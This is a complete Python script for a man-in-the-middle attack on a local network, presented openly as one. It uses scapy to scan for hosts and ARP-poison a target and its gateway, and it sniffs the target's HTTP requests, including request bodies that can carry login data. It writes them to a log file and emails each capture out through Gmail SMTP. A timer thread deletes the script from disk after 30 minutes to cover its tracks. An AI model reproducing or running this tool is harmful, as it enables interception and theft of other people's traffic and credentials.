import os
import sys
import time
import smtplib
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading

# Function to send email with captured data
def send_email(subject, body, to_email, from_email, password):
    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print("[*] Email sent successfully!")
    except Exception as e:
        print(f"[!] Error sending email: {str(e)}")

# Function to scan network and retrieve active clients
def scan_network(ip_range):
    print("[*] Scanning network...")
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    clients = []
    for element in answered_list:
        clients.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    return clients

# Function to perform ARP spoofing
def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not find MAC address for IP {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP tables to their original state
def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)

# Function to retrieve MAC address from an IP address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if len(answered_list) == 0:
        return None
    return answered_list[0][1].hwsrc

# Function to sniff network packets
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

# Function to process captured packets and extract HTTP request data
def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        print(f"[HTTP] {url}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            print(f"[DATA] {load}")
            with open("log.txt", "a") as logfile:
                logfile.write(f"URL: {url}\nDATA: {load}\n\n")
            # Send email after capturing data
            subject = "Captured Data"
            body = f"URL: {url}\nDATA: {load}\n"
            send_email(subject, body, email_to, email_from, email_password)

# Function to auto-remove script after 30 minutes
def auto_remove():
    print("[*] Script will auto-remove after 30 minutes.")
    time.sleep(1800)  # Wait for 30 minutes (1800 seconds)
    print("[*] Removing script and cleanup...")
    os.remove(sys.argv[0])
    sys.exit()

# Main function to initiate MITM attack
def main():
    global email_from, email_password, email_to
    
    # Prompt user for necessary inputs
    email_from = input("[?] Enter your Gmail address (sender): ")
    email_password = input("[?] Enter your Gmail password: ")
    email_to = input("[?] Enter the email address to receive data: ")
    target_ip = input("[?] Enter Target IP: ")
    gateway_ip = input("[?] Enter Gateway IP: ")
    interface = input("[?] Enter Network Interface (e.g., wlan0): ")

    try:
        print("[*] Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Launching MITM attack...")
        
        # Start the auto-remove function in a separate thread
        threading.Thread(target=auto_remove, daemon=True).start()
        
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sniff(interface)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C. Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Exiting...")

if __name__ == "__main__":
    main()

